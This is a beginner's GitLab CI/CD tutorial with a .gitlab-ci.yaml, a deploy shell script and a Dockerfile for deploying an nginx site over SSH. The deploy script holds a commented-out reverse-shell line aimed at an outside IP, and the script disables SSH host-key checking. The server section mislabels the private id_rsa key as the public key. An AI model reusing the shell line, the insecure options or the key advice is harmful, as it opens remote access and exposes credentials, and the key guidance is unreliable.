# Documentation of CI/CD Project
What is CI/CD? That stand for Continuous integration (CI)/Continuous Deployment(CD). List what procced of deployment with Gitlab CI/CD.
- Make a Gitlab Project
- Make a CI/CD Pipline
- Deploy to a Server with CI/CD 

## 1. Gitlab Project
Before u create a project, u need an Gitlab account first. After that u can click the button ***"new project"*** in right corner.
![index_image_google](/images/g_1a.png)
After that u can select ***"Create Blank Project"***
![index_image_google](/images/g_1b.png)
Fill all data and then click ***"create project"***
![index_image_google](/images/g_2.png)

## 2. CI/CD Models

### a. Edit your Gitlab Project
After that you can clone the project in your local/pc. And then you can upload/push some file what we need for make this project. There are :
- Website files
- Configuration

For Website files u can add hmtl, css, js, images, and etc in ***One Folder*** in this case named ***Website*** on the menandap of the repo.

For Configuration files there are .gitlab-ci.yaml, .gitlab-deploy.sh  .

***.gitlab-ci.yaml***

```yaml
stage-build:
  image: docker:18.09-dind
  stage: build
  services:
    - docker:dind
  variables:
    DOCKER_HOST: tcp://docker:2375/
    DOCKER_DRIVER: overlay2
    DOCKER_TLS_CERTDIR: ""
  script:
    - . .gitlab-deploy.sh "BUILD"


stage-prod:
  image: ruby:2.5
  stage: deploy
  script:
    - . .gitlab-deploy.sh "DEPLOY"
  # when: manual

```

***gitlab-deploy.sh***
```bash 
#!/bin/bash
WAKTU=$(date '+%Y-%m-%d.%H')
echo "$SSH_KEY" > key.pem
chmod 400 key.pem

if [ "$1" == "BUILD" ];then
echo '[*] Building Program To Docker Images'
echo "[*] Tag $WAKTU"
docker build -t menandap/belajardevops:$CI_COMMIT_BRANCH .
docker login --username=$DOCKER_USER --password=$DOCKER_PASS
docker push menandap/belajardevops:$CI_COMMIT_BRANCH
echo $CI_PIPELINE_ID

elif [ "$1" == "DEPLOY" ];then
echo "[*] Tag $WAKTU"
echo "[*] Deploy to production server in version $CI_COMMIT_BRANCH"
echo '[*] Generate SSH Identity'
HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub
echo '[*] Execute Remote SSH'
# bash -i >& /dev/tcp/103.41.207.252/1234 0>&1
ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker login --username=$DOCKER_USER --password=$DOCKER_PASS"
ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker pull menandap/belajardevops:$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker stop belajardevops-$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker rm belajardevops-$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker run -d -p 3003:80 --restart always --name belajardevops-$CI_COMMIT_BRANCH menandap/belajardevops:$CI_COMMIT_BRANCH"
# ssh -i key.pem -o "StrictHostKeyChecking no" menandap@119.13.124.218 "docker exec farmnode-main sed -i 's/farmnode_staging/farmnode/g' /var/www/html/application/config/database.php"
echo $CI_PIPELINE_ID
fi

```
***Dockerfile***
```Dockerfile
FROM nginx:latest
COPY website/ /usr/share/nginx/html
```

### b. Configure your Server
In your server u need to configure public key so in the project u can login with the ***pem*** key

```bash 
ssh-keygen -t rsa -b 2048
```

After that you can check if the key was maked by see in **.ssh** dir, in there will have 3 files authorized_key, id_rsa, and id_rsa.pub.

![index_image_google](/images/g_3.png)

***noted*** : if there no authorized_keys, u can make it.
```bash
touch authorized_keys
cat id_rsa.pub > authorized_keys
```
Now u can see the id_rsa files, that contain the public key that make u can login the server. Copy the key in id_rsa files and then save and name it ***key.pem***.





